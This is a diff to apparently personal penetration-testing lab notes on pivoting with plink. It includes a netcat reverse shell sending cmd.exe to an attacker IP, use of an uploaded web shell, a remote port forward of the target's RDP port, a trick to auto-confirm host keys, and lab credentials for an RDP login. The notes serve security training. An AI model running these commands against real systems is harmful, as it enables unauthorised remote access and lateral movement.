@@ -869,7 +869,6 @@ postgres=#
 
 
 ## plink
-
 - Command-line counterpart to Putty
 - Doesn't have remote dynamic port forwarding (verify)
 
@@ -880,6 +879,8 @@ postgres=#
 	- This is blocked by the firewall, so we can't connect directly.
 
 #### Execution
+![](plink.png)
+
 - Get an interactive reverse shell from MULTISERVER03
 	- From our initial exploitation, we uploaded a basic web shell at **/umbraco/forms.aspx**.
 	- Browse to the URL and run whatever Windows commands wanted (will be run as the _iis apppool\\defaultapppool_ user).
@@ -917,16 +918,15 @@ C:\Windows\Temp\nc.exe -e cmd.exe 192.168.45.4 4446
 
 - Set up Plink with a remote port forward in order to access the MULTISERVER03 RDP port from Kali
 ```bash
-C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
-C:\Windows\Temp\plink.exe -ssh -l kali -pw kali -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
+C:\Windows\Temp\plink.exe -ssh -l kali -pw [password] -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.161
 The host key is not cached for this server:
   192.168.118.4 (port 22)
 You have no guarantee that the server is the computer
 you think it is.
-The server's ssh-ed25519 key fingerprint is:
+The server''s ssh-ed25519 key fingerprint is:
   ssh-ed25519 255 SHA256:q1QQjIxHhSFXfEIT4gYrRF+zKr0bcLMOJljoINxThxY
 If you trust this host, enter "y" to add the key to
-PuTTY's cache and carry on connecting.
+PuTTY''s cache and carry on connecting.
 If you want to carry on connecting just once, without
 adding the key to the cache, enter "n".
 If you do not trust this host, press Return to abandon the
@@ -946,9 +946,19 @@ kali@kali:~$
 ```
 	- After the **-R** option
 		- The socket to open on the Kali SSH server
-		- The RDP server port on the loopback interface of MULTISERVER03 that we want to forward packets to.
+		- The RDP server port on the loopback interface of MULTISERVER03 that we want to forward packets to <kali IP>.
 	- We will also pass the username (**-l**) and password (**-pw**) directly on the command line.
 
+> With limited shells (like non-tty Linux ones), you may not be able to enter a response for the `Store key in cache` request.
+> Automate the confirmation with `cmd.exe /c echo y`, piped into the **plink.exe** command. This will emulate the confirmation that we usually type when prompted. The entire command would be: `cmd.exe /c echo y | plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 <kali ip>`
+
+- RDP into the server
+```bash
+xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833
+```
+
+
+## netsh
 
 
 
